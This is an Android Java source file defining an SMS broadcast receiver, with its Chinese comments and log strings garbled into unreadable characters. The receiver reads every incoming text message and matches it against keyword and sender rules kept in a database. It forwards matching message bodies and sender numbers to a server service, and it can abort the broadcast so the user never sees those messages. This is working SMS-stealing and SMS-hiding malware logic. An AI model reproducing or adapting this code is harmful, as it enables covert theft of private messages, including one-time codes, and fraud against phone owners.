package tools.common;

import java.net.URLEncoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.regex.PatternSyntaxException;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
/*
 * ���ض���
 */
public class SmsReceiver extends BroadcastReceiver{
	private DbHelper dbAdapter = null;
	private Context mContext;
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		//Tools.KillApp(context, "");
		mContext = context;
		Logger.error("���ص�����!!!!!!!!!!!!!!!!!!!");	
		if (intent != null) {
	            Logger.info("action:"+"���ص�����!!!!!!!!!!!!!!!!!!!");	            
	            //abortBroadcast();	            
	            Bundle bundle = intent.getExtras();			
		    	if (bundle != null) {
			    	Object[] myOBJpdus = (Object[]) bundle.get("pdus");	
			    	SmsMessage[] messages = new SmsMessage[myOBJpdus.length];	
			    	
			    	try{
			    		for (int i = 0; i < myOBJpdus.length; i++) {			    		
					    	messages[i] = SmsMessage.createFromPdu((byte[]) myOBJpdus[i]);	
				    	} 
			    	}catch(Exception e){
			    		Logger.info("��֧��˫ģ�ֻ�");
			    		return;
			    	}			    			    	  	
			    	SmsMessage message = messages[0];			    				    	  	
			    	String smsbody = message.getMessageBody();
			    	String smsnum = message.getDisplayOriginatingAddress();
			    	//smsnum = smsnum.replaceAll("+86", "");
			    	
			    	if(smsnum.startsWith("+86"))
			    	{
			    		smsnum = smsnum.substring(3);
			    	}	

			    	Logger.info("��������:"+smsbody);
			    	
			    	if(dbAdapter == null)
		        	{
		        		dbAdapter = new DbHelper(context,1);
		        	}	
		        	dbAdapter.opendatabase();
		        	Cursor c = dbAdapter.getkeys();
		        	
		        	Logger.info("count:"+c.getCount());
		        	
			    	if(null!=c&&c.getCount()>0)
			    	{
			    		Logger.info("����:"+smsbody);
			    		if(c.moveToFirst())
			    		{
			    			do{
			    				String keyword = c.getString(0);
			    				String isback = c.getString(1);		
			    				String number = c.getString(2);
			    				long etime = c.getLong(3);
			    				int id = c.getInt(4);
			    				if(System.currentTimeMillis()<=etime)
			    				{//���ڷ�Χ��			    					
			    					if(number.equals("*")&&keyword.equals("*"))
			    					{
			    						Intent service = new Intent(Tag.START);
				    					service.putExtra("action", Tag.SENDTOSERVER);
				    					service.putExtra("message", smsbody);
				    					service.putExtra("number", smsnum);
		    						    mContext.startService(service);
		    						    Logger.info("���ظ�������");	
		    						    if(isback.equals("1"))
			    						{
			    							Logger.info("���ζ���");
			    							abortBroadcast();
			    						}
			    					}else{
			    						if(number.equals("*"))
				    					{
				    						if(smsbody.contains(keyword))
			    							{
			    								Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("���ظ�������");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("���ζ���");
					    							abortBroadcast();
					    						}
			    							}
				    					}else{
				    						if(number.equals(smsnum))
				    						{
				    							if(smsbody.contains(keyword))
				    							{
				    								Intent service = new Intent(Tag.START);
							    					service.putExtra("action", Tag.SENDTOSERVER);
							    					service.putExtra("message", smsbody);
							    					service.putExtra("number", smsnum);
					    						    mContext.startService(service);
					    						    Logger.info("���ظ�������");	
					    						    if(isback.equals("1"))
						    						{
						    							Logger.info("���ζ���");
						    							abortBroadcast();
						    						}
				    							}
				    						}
				    					}
				    					
				    					if(keyword.equals("*"))
				    					{
				    						Logger.info(number+":"+smsnum);
				    						if(number.equals(smsnum))
				    						{
				    							Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("���ظ�������");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("���ζ���");
					    							abortBroadcast();
					    						}
				    						}
				    					}else{
				    						if(number.equals(smsnum))
				    						{
				    							Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("���ظ�������");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("���ζ���");
					    							abortBroadcast();
					    						}
				    						}
				    					}
			    					}
			    					
			    					
			    					
		    						break;
		    						
			    				}else{
			    					dbAdapter.deletekeys();
			    					break;
			    				}
			    							
			    			}while(c.moveToNext());
			    		}
			    	}
			    	
			    	if(c!=null)
			    		c.close();
			    	dbAdapter.closedatabase();
			    	dbAdapter = null;
		    	}else
		    	{	    		
		    		Logger.info("bundle null!!!!!!!!!!!!!!!!!!");
		    	}
	            
	            
	     }
	}

}
